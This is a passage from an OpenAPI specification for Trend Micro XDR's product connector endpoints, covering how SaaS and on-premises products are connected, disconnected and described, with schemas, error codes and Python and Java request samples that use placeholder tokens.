                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/connectors/saas'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/connectors/saas\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "post": {
        "tags": [
          "SaaS"
        ],
        "summary": "Connect SaaS product",
        "description": "Connects a SaaS product to the XDR service platform\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Product Connector</b><br>\n  <ul>\n    <li>Connect/Disconnect products and edit descriptions</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "required": [
                  "productId"
                ],
                "type": "object",
                "properties": {
                  "productId": {
                    "type": "string",
                    "description": "Device product ID definition: sca-Cloud App Security\n"
                  },
                  "description": {
                    "type": "string",
                    "description": "Description of the connector"
                  },
                  "productSubType": {
                    "type": "integer",
                    "description": "For sca, 0: MICROSOFT (default), 1: GMAIL."
                  }
                }
              }
            }
          },
          "required": false
        },
        "responses": {
          "200": {
            "description": "Successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "description": "A human-readable representation of the code"
                    },
                    "data": {
                      "type": "object",
                      "description": "Response data, optional, JSON object"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "Invalid parameters",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal server error",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "One of a server-defined set of codes\n* InternalServerError\n* DbError\n* DeleteServiceUrlFail\n* DeleteEMSConfiglFail\n* DeleteAuthNAPIKeyFail\n* PushProvisioningTaskFail\n* GenerateAuthNTokenFail\n* CLPServiceFail\n* SESServiceFail\n",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-codegen-request-body-name": "root",
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/connectors/saas'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'productId': 'YOUR_PRODUCTID (string)',\n    'description': 'YOUR_DESCRIPTION (string)',\n    'productSubType': 'YOUR_PRODUCTSUBTYPE (integer)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/connectors/saas\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"productId\\\": \\\"YOUR_PRODUCTID (string)\\\",\" +\n                \"    \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\",\" +\n                \"    \\\"productSubType\\\": \\\"YOUR_PRODUCTSUBTYPE (integer)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/connectors/saas/{id}": {
      "delete": {
        "tags": [
          "SaaS"
        ],
        "summary": "Disconnect SaaS product",
        "description": "Disconnects a SaaS product from the XDR service platform\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Product Connector</b><br>\n  <ul>\n    <li>Connect/Disconnect products and edit descriptions</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "id",
            "in": "path",
            "description": "ID of the product connector",
            "required": true,
            "schema": {
              "type": "integer"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "Successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "description": "A human-readable representation of the code"
                    },
                    "data": {
                      "type": "object",
                      "properties": {},
                      "description": "Response data, optional, JSON object"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "Invalid parameters",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal server error",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "One of a server-defined set of codes\n* InternalServerError\n* DbError\n* DeleteServiceUrlFail\n* DeleteEMSConfiglFail\n* DeleteAuthNAPIKeyFail\n* PushProvisioningTaskFail\n* GenerateAuthNTokenFail\n* CLPServiceFail\n* SESServiceFail\n",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/connectors/saas/{id}'\nurl_path = url_path.format(**{'id': 'YOUR_ID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.delete(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/connectors/saas/{id}\";\n        urlPath = urlPath.replace(\"{id}\", \"YOUR_ID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.delete(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "patch": {
        "tags": [
          "SaaS"
        ],
        "summary": "Edit SaaS product description",
        "description": "Modifies the description of a SaaS product that is connected to the  XDR service platform\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Product Connector</b><br>\n  <ul>\n    <li>Connect/Disconnect products and edit descriptions</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "id",
            "in": "path",
            "description": "ID of the product connector",
            "required": true,
            "schema": {
              "type": "integer"
            }
          }
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "required": [
                  "description"
                ],
                "type": "object",
                "properties": {
                  "description": {
                    "type": "string",
                    "description": "Description of the product connector"
                  }
                }
              }
            }
          },
          "required": false
        },
        "responses": {
          "200": {
            "description": "Successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "description": "A human-readable representation of the code"
                    },
                    "data": {
                      "type": "object",
                      "properties": {},
                      "description": "Response data, optional, JSON object"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "Invalid parameters",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal server error",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "One of a server-defined set of codes\n* InternalServerError\n* DbError\n* DeleteServiceUrlFail\n* DeleteEMSConfiglFail\n* DeleteAuthNAPIKeyFail\n* PushProvisioningTaskFail\n* GenerateAuthNTokenFail\n* CLPServiceFail\n* SESServiceFail\n",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-codegen-request-body-name": "body",
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/connectors/saas/{id}'\nurl_path = url_path.format(**{'id': 'YOUR_ID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'description': 'YOUR_DESCRIPTION (string)'\n}\n\nr = requests.patch(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/connectors/saas/{id}\";\n        urlPath = urlPath.replace(\"{id}\", \"YOUR_ID\");\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.patch(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/connectors/onpremise/{id}": {
      "delete": {
        "tags": [
          "On-Premises"
        ],
        "summary": "Disconnect on-premises product",
        "description": "Disconnects an on-premises product from the XDR service platform\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Product Connector</b><br>\n  <ul>\n    <li>Connect/Disconnect products and edit descriptions</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "id",
            "in": "path",
            "description": "ID of the product connector",
            "required": true,
            "schema": {
              "type": "integer"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "Successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "description": "A human-readable representation of the code"
                    },
                    "data": {
                      "type": "object",
                      "properties": {},
                      "description": "Response data, optional, JSON object"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "Invalid parameters",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal server error",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "One of a server-defined set of codes\n* InternalServerError\n* DbError\n* DeleteServiceUrlFail\n* DeleteEMSConfiglFail\n* DeleteAuthNAPIKeyFail\n* PushProvisioningTaskFail\n* GenerateAuthNTokenFail\n* CLPServiceFail\n* SESServiceFail\n",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/connectors/onpremise/{id}'\nurl_path = url_path.format(**{'id': 'YOUR_ID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.delete(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/connectors/onpremise/{id}\";\n        urlPath = urlPath.replace(\"{id}\", \"YOUR_ID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.delete(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "patch": {
        "tags": [
          "On-Premises"
        ],
        "summary": "Edit details of on-premises product",
        "description": "Modifies the description and product subtype of an on-premises product that is connected to the XDR service platform\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Product Connector</b><br>\n  <ul>\n    <li>Connect/Disconnect products and edit descriptions</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "id",
            "in": "path",
            "description": "ID of the product connector",
            "required": true,
            "schema": {
              "type": "integer"
            }
          }
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "properties": {
                  "description": {
                    "type": "string",
                    "description": "Description of the product connector"
                  },
                  "productSubType": {
                    "type": "integer",
                    "description": "Device product sub type definition:\n  0: none,\n  For DDD (productId:pdd), 1:onpremise version, 2: cloud version, 3: network sensor\n"
                  }
                }
              }
            }
          },
          "required": false
        },
        "responses": {
          "200": {
            "description": "Successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "description": "A human-readable representation of the code"
                    },
                    "data": {
                      "type": "object",
                      "properties": {},
                      "description": "Response data, optional, JSON object"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "Invalid parameters",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "Internal server error",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "One of a server-defined set of codes\n* InternalServerError\n* DbError\n* DeleteServiceUrlFail\n* DeleteEMSConfiglFail\n* DeleteAuthNAPIKeyFail\n* PushProvisioningTaskFail\n* GenerateAuthNTokenFail\n* CLPServiceFail\n* SESServiceFail\n",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "description": "A human-readable representation of the code"
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-codegen-request-body-name": "body",
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/connectors/onpremise/{id}'\nurl_path = url_path.format(**{'id': 'YOUR_ID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'description': 'YOUR_DESCRIPTION (string)',\n    'productSubType': 'YOUR_PRODUCTSUBTYPE (integer)'\n}\n\nr = requests.patch(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/connectors/onpremise/{id}\";\n        urlPath = urlPath.replace(\"{id}\", \"YOUR_ID\");\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\",\" +\n                \"    \\\"productSubType\\\": \\\"YOUR_PRODUCTSUBTYPE (integer)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.patch(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if 